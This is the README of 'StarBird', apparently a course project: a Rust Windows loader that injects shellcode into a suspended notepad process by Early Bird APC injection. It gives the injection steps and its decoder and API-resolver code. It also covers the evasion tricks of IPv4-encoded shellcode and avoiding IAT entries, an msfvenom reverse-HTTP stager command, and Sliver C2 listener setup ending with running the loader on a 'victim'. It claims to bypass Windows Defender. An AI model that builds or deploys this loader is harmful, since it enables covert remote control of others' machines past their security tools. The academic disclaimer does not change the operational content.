
<div align="center">

# StarBird




# Early Bird APC Injection · Stargate Resolver

**Early Bird gets the worm. Before the EDR does.**



</div>

---

> **Disclaimer:** This project was developed strictly for academic project as part of our  Software Security and Exploitation course. All testing was performed in isolated lab environments on machines we own. Do not use this against systems without explicit written authorization. The authors are not responsible for misuse.

---


## Table of Contents

- [What is this?](#what-is-this)
- [How it works](#how-it-works)
  - [Early Bird APC Injection](#early-bird-apc-injection)
  - [IPfuscation — Shellcode Obfuscation](#ipfuscation--shellcode-obfuscation)
  - [Stargate API Resolver](#stargate-api-resolver)
- [C2 Setup (Sliver)](#c2-setup-sliver)


---

## What is this?

**StarBird** is a Windows loader prototype that demonstrates Early Bird APC Injection — a process injection technique that executes shellcode inside a legitimate Windows process *before* any AV/EDR DLLs are loaded into it.

Key properties of this loader:

- **No suspicious IAT entries** — all NT APIs resolved at runtime via [Stargate](https://github.com/Teach2Breach/stargate) (signature-based, no PEB walking)
- **No recognizable shellcode on disk** — payload encoded as IPv4 address strings (IPfuscation), decoded at runtime using `RtlIpv4StringToAddressA`
- **No RWX memory** — allocates RW, writes shellcode, then flips to RX before queuing the APC
- **Tested on Windows 11 Build 26100** — bypassed Windows Defender

---

## How it works

### Early Bird APC Injection

When Windows creates a process with the `CREATE_SUSPENDED` flag, the primary thread is paused before any user-mode code runs — crucially, *before* EDR DLLs are injected into the target process.

When the thread is eventually resumed, the Windows loader calls `NtTestAlert()` internally, which drains the thread's APC queue **before** transferring control to the program's real entry point (`RtlUserThreadStart`). This is the window we exploit.


**Injection steps:**

```
1. CreateProcessW(notepad.exe, CREATE_SUSPENDED)
         │
         ▼
2. NtAllocateVirtualMemory(hProcess, RW, size)
         │
         ▼
3. ip_to_bytes(shellcode_ips)  ← decode IPv4 list → raw bytes
         │
         ▼
4. NtWriteVirtualMemory(hProcess, base_addr, payload)
         │
         ▼
5. NtProtectVirtualMemory(hProcess, base_addr, RX)   ← no RWX ever
         │
         ▼
6. NtQueueApcThread(hThread, base_addr)
         │
         ▼
7. ResumeThread(hThread)  → shellcode executes → stager calls back → Sliver session
```

---

### IPfuscation — Shellcode Obfuscation

Raw shellcode bytes are trivially detected by static AV scanners. IPfuscation encodes every 4 bytes of shellcode as a dotted-decimal IPv4 string:

```
\xfc\x48\x83\xe4  →  "252.72.131.228"
\xf0\xe8\xcc\x00  →  "240.232.204.0"
```

 ipfuscator.py script converts the msfvenom-generated `.bin` to a Rust array literal:


At runtime, `decoder.rs` uses `RtlIpv4StringToAddressA` (a legitimate Windows API from ntdll) to parse each string back into 4 bytes — no custom XOR keys, no decryption routines, just a Windows API doing what it was designed to do.

```rust
// decoder.rs
RtlIpv4StringToAddressA(
    PCSTR(ip_str.as_ptr()),
    false,
    &mut terminator,
    temp_bytes.as_mut_ptr() as *mut _
);
shellcode.extend_from_slice(&temp_bytes);
```

---

### Stargate API Resolver

Rather than importing suspicious functions statically (which shows up in the IAT) or walking the PEB (a well-known malware pattern), we use [**Stargate**](https://github.com/Teach2Breach/stargate) by Teach2Breach.

Stargate does two things differently:

| Technique | Traditional | Stargate |
|---|---|---|
| Find DLL base | PEB walk (`InMemoryOrderModuleList`) | Call-stack inspection |
| Find function | Parse EAT by name hash | Byte signature scanning |

This means:
- No PEB traversal pattern in memory
- No suspicious API names in the binary's import table

```rust
// resolver.rs
let resolver = StargateResolver::new()?;

// All resolved at runtime — zero static imports
let nt_alloc:     NtAllocateVM  = transmute(resolver.resolve_nt("NtAllocateVirtualMemory")?);
let nt_write:     NtWriteVM     = transmute(resolver.resolve_nt("NtWriteVirtualMemory")?);
let nt_protect:   NtProtectVM   = transmute(resolver.resolve_nt("NtProtectVirtualMemory")?);
let nt_queue_apc: NtQueueApc    = transmute(resolver.resolve_nt("NtQueueApcThread")?);
let create_proc:  CreateProcessW = transmute(resolver.resolve_k32("CreateProcessW")?);
let resume:       ResumeThread  = transmute(resolver.resolve_k32("ResumeThread")?);
```

---

## C2 Setup (Sliver)

**1. Generate stager with msfvenom:**

```bash
msfvenom -p windows/x64/custom/reverse_winhttp \
  LHOST=<KALI_IP> \
  LPORT=8443 \
  LURI=/test.woff \
  -f raw -o stager.bin
```

**2. Convert to IP list:**

```bash
python3 ipfuscator.py stager.bin
# Copy the output array into src/main.rs → shellcode_ips
```

**3. Configure Sliver C2:**

```
sliver > profiles new --http <KALI_IP> --arch amd64 --format shellcode my_profile
sliver > stage-listener --url http://<KALI_IP>:8443 --profile my_profile --prepend-size
sliver > http
```

**4. Build and run loader on victim:**

```bash
cargo build --release --target x86_64-pc-windows-gnu
# Transfer and execute starbird.exe on target
```

---
